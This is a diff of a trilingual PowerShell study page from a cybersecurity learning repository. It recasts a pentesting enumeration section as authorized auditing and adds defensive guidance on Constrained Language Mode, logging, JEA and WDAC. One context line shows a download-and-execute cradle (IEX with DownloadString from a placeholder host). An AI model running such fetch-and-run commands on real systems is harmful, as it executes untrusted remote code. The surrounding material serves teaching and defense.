@@ -1,10 +1,16 @@
 # 💠 PowerShell
 
-> **LearnCybersecurity** | Windows Fundamentals Series  
-> 📅 Last Updated: 2026 | 👤 Author: kodoktheGr3at
+> **LearnCybersecurity** | Basics Series | kodoktheGr3at | 2026
 
 ---
 
+
+<!-- LC-CURRICULUM-START -->
+> **Curriculum ID:** `LC-003` | **Phase 0:** Foundations  
+> **Est. study:** 4-5h | **Level:** Beginner  
+> **Prerequisites:** LC-001  
+> **Book map:** Gray Hat Hacking Â Windows post-exploitation chapters
+<!-- LC-CURRICULUM-END -->
 ## 📖 Daftar Isi / Table of Contents / 目次
 
 | # | Category | Bahasa Indonesia | English | 日本語 |
@@ -16,8 +22,9 @@
 | 5 | Network | Perintah jaringan | Network commands | ネットワークコマンド |
 | 6 | User & Process | User & proses | Users & processes | ユーザー・プロセス |
 | 7 | Pipeline & Objects | Pipeline & objek | Pipeline & objects | パイプラインとオブジェクト |
-| 8 | Pentesting | Perintah enumerasi | Enumeration commands | 列挙コマンド |
-| 9 | Cheatsheet | Referensi cepat | Quick reference | クイックリファレンス |
+| 8 | Host Enumeration | Enumerasi host (izin) | Authorized host enumeration | 許可下のホスト列挙 |
+| 9 | Security Note | CLM, logging & hardening | Constrained language & logging defense | 制約言語モードとログ防御 |
+| 10 | Cheatsheet | Referensi cepat | Quick reference | クイックリファレンス |
 
 ---
 
@@ -430,16 +437,16 @@ PS C:\> Get-ChildItem | ForEach-Object { Write-Host $_.Name }
 
 ---
 
-## 8. 🛡️ Pentesting — Enumeration Commands
+## 8. 🛡️ Authorized Host Enumeration
 
 ### 🇮🇩 Bahasa Indonesia
-PowerShell adalah tool **post-exploitation** utama di Windows. Berikut perintah-perintah cepat untuk enumerasi dan pencarian peluang **privilege escalation**.
+Pada **uji berizin** / lab sendiri, PowerShell berguna untuk inventaris host dan audit konfigurasi. Gunakan hanya pada sistem yang Anda miliki izinnya.
 
 ### 🇬🇧 English
-PowerShell is the primary **post-exploitation** tool on Windows. Below are quick commands for enumeration and finding **privilege escalation** opportunities.
+On **authorized** engagements / your own lab, PowerShell helps inventory hosts and audit configuration. Use only on systems you are permitted to assess.
 
 ### 🇯🇵 日本語
-PowerShellはWindowsにおける主要な**ポストエクスプロイテーション**ツールです。以下は列挙と**権限昇格**の機会を見つけるための迅速なコマンドです。
+**許可された**検証や自ラボでは、PowerShellでホスト棚卸しと設定監査が可能です。許可されたシステムでのみ使用してください。
 
 ```powershell
 # ── Basic Recon ─────────────────────────────────────
@@ -481,6 +488,59 @@ IEX (New-Object Net.WebClient).DownloadString('http://target.com/script.ps1')
 ```
 
 > ⚠️ **Note:** These commands are intended for **authorized** penetration testing and CTF environments only. Many EDR/AV solutions flag `IEX`, `DownloadString`, and execution-policy bypasses — use with awareness of detection.
+
+---
+
+## 9. 🔐 Security Note — Admin Hardening, Constrained Language & Logging
+
+### 🇮🇩 Bahasa Indonesia
+PowerShell sering disalahgunakan oleh malware, jadi **kontrol admin + logging** adalah lapisan defense kritis di Windows.
+
+### 🇬🇧 English
+Because malware frequently abuses PowerShell, **admin controls and logging** are critical Windows defenses.
+
+### 🇯🇵 日本語
+マルウェアがPowerShellを悪用しやすいため、**管理者制御とログ**はWindows防御の重要層です。
+
+```powershell
+# ── Language mode (defense posture) ─────────────────────────
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage
+# Constrained Language Mode (CLM) blocks most .NET / COM abuse while
+# allowing approved cmdlets — pair with AppLocker/WDAC script rules.
+
+# ── Execution policy (necessary but NOT a security boundary) ─
+Get-ExecutionPolicy -List
+# Prefer: AllSigned / RemoteSigned for admins; enforce via GPO.
+# Attackers can bypass process-scoped policy — rely on WDAC + logging.
+
+# ── Script Block Logging / Module Logging / Transcription ────
+# Enable via GPO (recommended) under:
+# Computer Config → Admin Templates → Windows Components → Windows PowerShell
+#  - Turn on PowerShell Script Block Logging
+#  - Turn on Module Logging (core modules + *)
+#  - Turn on PowerShell Transcription (central share)
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20
+
+# ── Just Enough Administration (JEA) ─────────────────────────
+# Expose only approved cmdlets/functions to remote admins
+Get-PSSessionConfiguration | Format-Table Name, Permission
+
+# ── Least privilege for interactive admins ───────────────────
+# Daily work: standard user; elevate only for change windows
+whoami /groups | findstr /i "Admin High Mandatory"
+```
+
+| Control | 🇮🇩 | 🇬🇧 | 🇯🇵 |
+|---------|----|----|----|
+| Constrained Language Mode | Batasi .NET berbahaya | Limit dangerous .NET/COM | 危険な.NET/COMを制限 |
+| WDAC / AppLocker | Izinkan script bertanda | Allow only signed/approved | 署名済みのみ許可 |
+| Script Block Logging | Audit isi script | Audit script contents | スクリプト内容を監査 |
+| Transcription | Rekam sesi admin | Record admin sessions | 管理セッション記録 |
+| JEA | Admin remote minimal | Minimal remote admin surface | 最小のリモート管理面 |
+| AMSI + Defender | Deteksi script jahat | Detect malicious scripts | 悪意スクリプト検知 |
+
+> 🛡️ **Defense-first:** ExecutionPolicy alone is not a security boundary. Combine **WDAC/AppLocker + CLM + Script Block Logging + JEA** and monitor Event ID 4104/4103 for anomalous admin activity.
 
 ---
 
@@ -584,22 +644,23 @@ Get-Process | Select-Object Name, Id           # select fields
 Get-Process | Format-Table -AutoSize           # format as table
 Get-Process | ConvertTo-Json                   # convert to JSON
 
-# ── ENUMERATION (PENTESTING) ────────────────────────────────
-whoami /priv                                   # current privileges
-Get-ExecutionPolicy                            # check exec policy
-Get-ScheduledTask | Select TaskName, State     # scheduled tasks
-Get-CimInstance Win32_Service | Select Name, PathName, StartMode  # services
-Get-Content (Get-PSReadlineOption).HistorySavePath   # PS command history
+# ── DEFENSE / HARDENING CHECKS ──────────────────────────────
+$ExecutionContext.SessionState.LanguageMode   # expect ConstrainedLanguage where enforced
+Get-ExecutionPolicy -List                     # policy inventory (not a boundary alone)
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
+Get-PSSessionConfiguration | Format-Table Name, Permission
 ```
 
 ---
 
 > 📚 **References & Book Sources:**
-> - Peter Kim — *The Hacker Playbook 3: Practical Guide To Penetration Testing* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
+> - Peter Kim — *The Hacker Playbook 3* (`~/Documents/Books/CyberSec/Ethical Hacking/`) — authorized methodology context
 > - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
+> - Allen Harper et al. — *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
+> - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview) · Script Block Logging · JEA · Constrained Language Mode
 > - [HackTheBox Academy - Windows Fundamentals](https://academy.hackthebox.com)
-> - `Get-Help <cmdlet> -Full`, Microsoft Docs — [PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/)
-> - PowerSploit, Empire, Nishang — common offensive PowerShell frameworks
+> - `Get-Help <cmdlet> -Full`
 
+> **LearnCybersecurity** | Basics Series | kodoktheGr3at | 2026  
 > 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
 > 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.
